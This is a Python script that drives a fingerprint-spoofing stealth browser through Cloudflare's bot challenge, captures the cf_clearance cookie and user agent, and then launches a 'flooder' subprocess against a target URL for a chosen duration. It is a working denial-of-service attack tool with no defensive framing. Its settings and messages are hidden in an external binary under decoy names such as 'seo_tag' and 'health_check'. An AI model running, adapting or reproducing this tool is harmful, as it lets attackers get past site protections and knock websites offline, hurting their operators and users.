import shlex
import asyncio
import subprocess
import sys
import random
import json
from dataclasses import dataclass
from typing import Any, Dict

from camoufox.async_api import AsyncCamoufox
from browserforge.fingerprints import Screen
from colorama import init, Fore, Style

init(autoreset=True)

result = subprocess.run(["./element", "--key", "executor"], stdout=subprocess.PIPE, text=True)
CONFIG = json.loads(result.stdout.strip())

@dataclass
class CloudflareCookie:
    name: str
    value: str
    domain: str
    path: str
    expires: int
    http_only: bool
    secure: bool
    same_site: str

    @classmethod
    def from_json(cls, cookie_data: Dict[str, Any]) -> "CloudflareCookie":
        return cls(
            name=cookie_data.get("name", ""),
            value=cookie_data.get("value", ""),
            domain=cookie_data.get("domain", ""),
            path=cookie_data.get("path", "/"),
            expires=cookie_data.get("expires", 0),
            http_only=cookie_data.get("httpOnly", False),
            secure=cookie_data.get("secure", False),
            same_site=cookie_data.get("sameSite", "Lax"),
        )

class CloudflareSolver:
    def __init__(self, sleep_time=int(CONFIG["sleep_cfg"]), headless=CONFIG["headless_cfg"].lower() == "true", os=None, debug=False, retries=int(CONFIG["attempts_cfg"])):
        self.cf_clearance = None
        self.sleep_time = sleep_time
        self.headless = headless
        self.os = os or [CONFIG["os_cfg"]]
        self.debug = debug
        self.retries = retries

    async def _find_and_click_challenge_frame(self, page):
        for frame in page.frames:
            if frame.url.startswith(CONFIG["cdn_origin"]):
                frame_element = await frame.frame_element()
                box = await frame_element.bounding_box()
                checkbox_x = box["x"] + box["width"] * CONFIG["offset_x"]
                checkbox_y = box["y"] + box["height"] * CONFIG["offset_y"]
                await asyncio.sleep(random.uniform(CONFIG["delay_mouse_min"], CONFIG["delay_mouse_max"]))
                await page.mouse.click(x=checkbox_x, y=checkbox_y)
                return True
        return False

    async def solve(self, link: str):
        try:
            print(f"{Fore.GREEN}{CONFIG['seo_tag']}{Style.RESET_ALL} {CONFIG['load_event']}")
            async with AsyncCamoufox(
                headless=self.headless,
                os=self.os,
                screen=Screen(max_width=1920, max_height=1080),
                args=CONFIG["browser_args"]
            ) as browser:
                page = await browser.new_page()
                await asyncio.sleep(random.uniform(0.5, 1.5))

                await page.goto(link)
                await asyncio.sleep(random.uniform(1, 2))

                await page.add_init_script(CONFIG["init_script"])
                await page.evaluate(CONFIG["stealth_patch"])

                title = await page.title()
                print(f"{Fore.YELLOW}{CONFIG['seo_tag']}{Style.RESET_ALL} {CONFIG['nav_str'].format(title=title)}")

                for _ in range(self.retries):
                    if await self._find_and_click_challenge_frame(page):
                        await asyncio.sleep(random.uniform(CONFIG["delay_solve_min"], CONFIG["delay_solve_max"]))
                        break
                    await asyncio.sleep(random.uniform(0.8, 1.2))

                await asyncio.sleep(random.uniform(1, 2))
                solved_title = await page.title()
                print(f"{Fore.YELLOW}{CONFIG['seo_tag']}{Style.RESET_ALL} {CONFIG['title_str'].format(solved_title=solved_title)}")

                cookies = await page.context.cookies()
                ua = await page.evaluate(CONFIG["js_hook"])

                cf_cookie = next((c for c in cookies if c["name"] == CONFIG["token_key"]), None)
                if cf_cookie:
                    self.cf_clearance = CloudflareCookie.from_json(cf_cookie)
                    print(f"{Fore.GREEN}{CONFIG['health_check']}{Style.RESET_ALL} {CONFIG['cookie_data'].format(cookie=self.cf_clearance.value)}")
                else:
                    print(f"{Fore.RED}{CONFIG['health_check']}{Style.RESET_ALL} {CONFIG['theme_error']}")
                    return None, None

                print(f"{Fore.GREEN}{CONFIG['health_check']}{Style.RESET_ALL} {CONFIG['ua_data'].format(ua=ua)}")
                print(f"{Fore.YELLOW}{CONFIG['seo_tag']}{Style.RESET_ALL} {CONFIG['unload_event']}")
                await asyncio.sleep(random.uniform(0.8, 1.2))

                return self.cf_clearance.value, ua

        except Exception as e:
            print(f"{Fore.RED}{CONFIG['viewport_tag']}{Style.RESET_ALL} {CONFIG['err_catcher'].format(link=link, e=e)}")
            return None, None

async def mscjs(url: str, duration: int):
    solver = CloudflareSolver()
    max_attempts = solver.retries
    cookie = None
    ua = None

    for attempt in range(1, max_attempts + 1):
        print(f"{Fore.CYAN}{CONFIG['script_src']}{Style.RESET_ALL} {CONFIG['load_loop'].format(attempt=attempt)}")
        cookie, ua = await solver.solve(url)
        if cookie and ua:
            break
        print(f"{Fore.RED}{CONFIG['link_css']}{Style.RESET_ALL} {CONFIG['retry_loop']}")

    if not cookie or not ua:
        print(f"{Fore.RED}{CONFIG['viewport_tag']}{Style.RESET_ALL} {CONFIG['failed_load'].format(max_attempts=max_attempts)}")
        return

    print(CONFIG['cookie_output'].format(cookie=cookie))
    print(CONFIG['ua_output'].format(ua=ua))
    print(CONFIG['timer_start'].format(duration=duration) + "\n")

    args = [
        shlex.split(s.format(
            url=url,
            duration=duration,
            cookie=cookie,
            ua=ua
        )) for s in CONFIG["flooder_args"]
    ]

# Flatten list if needed
    args = args[0] if len(args) == 1 else [item for sub in args for item in sub]

    print("[*] Subprocess args:", ' '.join(args))

    proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in proc.stdout:
        print(line, end='')

    proc.wait()
    print(CONFIG['timer_done'])

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"{Fore.RED}{CONFIG['usage_text']}{Style.RESET_ALL} {CONFIG['script_call']}")
        sys.exit(1)

    url = sys.argv[1]
    try:
        duration = int(sys.argv[2])
    except ValueError:
        print(f"{Fore.RED}{CONFIG['viewport_tag']}{Style.RESET_ALL} {CONFIG['script_error']}")
        sys.exit(1)

    asyncio.run(mscjs(url, duration))
